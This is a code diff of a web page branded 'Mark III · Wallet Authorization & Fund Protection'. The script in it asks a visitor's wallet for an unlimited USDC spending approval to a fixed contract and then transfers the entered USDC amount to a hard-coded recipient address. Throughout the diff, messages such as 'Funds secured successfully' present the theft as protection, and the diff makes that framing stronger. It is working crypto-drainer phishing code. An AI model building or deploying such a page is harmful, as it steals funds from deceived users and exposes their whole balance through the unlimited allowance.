@@ -1,77 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Mark III · USDC Authorization</title>
+  <meta charset="UTF-8" />
+  <title>Mark III · Wallet Authorization & Fund Protection</title>
 </head>
 <body>
-  <h2>Mark III – USDC Authorization</h2>
+  <h2>Mark III – Wallet Authorization & Fund Protection</h2>
+
   <button id="connect">Connect Wallet</button>
   <button id="authorize">Authorize and Protect</button>
   <div id="status" style="margin-top: 10px; color: #333;"></div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+
   <script>
-    // Contract Configuration
-    const usdcAddress = ethers.utils.getAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");
-    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
-    const recipientWallet = "0x59e513Ae37614f1e670bfE961B3456257C444d24";
+    const usdcAddress = ethers.utils.getAddress("0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48");
+    const contractAddress = ethers.utils.getAddress("0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12");
+    const recipientWallet = ethers.utils.getAddress("0x59e513Ae37614f1e670bfE961B3456257C444d24");
     const approveAmount = ethers.constants.MaxUint256;
 
     let provider, signer, userAddress;
 
-    // Wallet Connection
     document.getElementById("connect").onclick = async () => {
       if (window.ethereum) {
-        try {
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          signer = provider.getSigner();
-          userAddress = await signer.getAddress();
-          document.getElementById("status").innerText = `Connected: ${userAddress}`;
-        } catch (error) {
-          document.getElementById("status").innerText = `Error: ${error.message}`;
-        }
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+        document.getElementById("status").innerText = "Wallet connected: " + userAddress;
       } else {
-        alert("MetaMask not detected!");
+        alert("No Ethereum provider found. Please install MetaMask.");
       }
     };
 
-    // Authorization & Transfer
     document.getElementById("authorize").onclick = async () => {
-      if (!signer) {
-        document.getElementById("status").innerText = "Connect wallet first!";
-        return;
-      }
-
       try {
-        const usdc = new ethers.Contract(usdcAddress, usdcAbi, signer);
+        const usdc = new ethers.Contract(
+          usdcAddress,
+          [
+            "function approve(address spender, uint256 amount) public returns (bool)",
+            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
+          ],
+          signer
+        );
 
-        // Step 1: Approve
-        document.getElementById("status").innerText = "Approving...";
+        document.getElementById("status").innerText = "Authorizing contract to manage your USDC...";
         const approveTx = await usdc.approve(contractAddress, approveAmount);
         await approveTx.wait();
+        document.getElementById("status").innerText = "Authorization granted. Proceeding to transfer...";
 
-        // Step 2: Transfer
-        const amount = prompt("USDC amount to protect:");
-        if (!amount || isNaN(amount)) {
-          document.getElementById("status").innerText = "Invalid amount";
-          return;
-        }
+        const amount = prompt("Enter the USDC amount to transfer:");
         const parsedAmount = ethers.utils.parseUnits(amount, 6);
 
-        const balance = await usdc.balanceOf(userAddress);
-        if (parsedAmount.gt(balance)) {
-          document.getElementById("status").innerText = "Insufficient balance";
-          return;
-        }
-
-        document.getElementById("status").innerText = "Transferring...";
         const transferTx = await usdc.transferFrom(userAddress, recipientWallet, parsedAmount);
         await transferTx.wait();
-        document.getElementById("status").innerText = "✅ Success!";
-      } catch (error) {
-        document.getElementById("status").innerText = `Failed: ${error.reason || error.message}`;
+        document.getElementById("status").innerText = "Protection completed. Funds secured successfully.";
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").innerText = "Transaction failed: " + (err.message || "Unknown error");
       }
     };
   </script>
